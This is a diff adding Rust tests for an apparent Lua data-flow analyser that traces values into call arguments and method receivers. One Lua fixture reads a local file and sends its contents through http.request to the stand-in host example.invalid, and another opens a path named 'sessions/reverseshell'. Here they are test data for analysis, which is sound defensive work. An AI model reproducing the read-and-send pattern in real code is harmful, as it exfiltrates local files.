@@ -756,3 +756,57 @@ fn computed_receiver_retains_method_suffix_and_requires_a_transfer_model() {
         );
     }
 }
+
+#[test]
+fn lua_local_bindings_reach_call_arguments() {
+    let source = "function run()\nlocal path = 'sessions/reverseshell'\nio.open(path, 'rb')\npath = 'notes.txt'\nio.open(path, 'r')\nend\n";
+    let flow = graph("reader.lua", source);
+    let opens: Vec<_> = flow
+        .values
+        .iter()
+        .filter(|value| value.target.as_deref() == Some("io.open"))
+        .collect();
+    assert_eq!(opens.len(), 2);
+    for (call, expected) in opens.iter().zip(["sessions/reverseshell", "notes.txt"]) {
+        let origins = flow.origins(call.inputs[0], &[], 1000);
+        assert!(origins.values.iter().any(|origin| {
+            matches!(&flow.values[origin.value].literal, Some(crate::Arg::String { value }) if value == expected)
+        }), "{flow:?}");
+    }
+}
+
+#[test]
+fn lua_colon_calls_keep_method_and_receiver_provenance() {
+    let source = "local f=io.open('report.txt','r')\nlocal data=f:read('*a')\nhttp.request('https://example.invalid',data)\nlocal fake='x:write(data)'\nf:close()\n";
+    let flow = graph("methods.lua", source);
+    let read = flow
+        .values
+        .iter()
+        .find(|v| v.target.as_deref() == Some("f.read"))
+        .expect("colon read target");
+    let receiver = &flow.values[read.receiver.expect("file receiver")];
+    assert_eq!(receiver.target.as_deref(), Some("io.open"));
+    let request = flow
+        .values
+        .iter()
+        .find(|v| v.target.as_deref() == Some("http.request"))
+        .unwrap();
+    let origins = flow.origins(request.inputs[1], &[], 1000);
+    assert!(
+        origins
+            .values
+            .iter()
+            .any(|o| flow.values[o.value].target.as_deref() == Some("f.read"))
+    );
+    assert!(
+        flow.values
+            .iter()
+            .any(|v| v.target.as_deref() == Some("f.close"))
+    );
+    assert!(
+        !flow
+            .values
+            .iter()
+            .any(|v| v.target.as_deref() == Some("x.write"))
+    );
+}
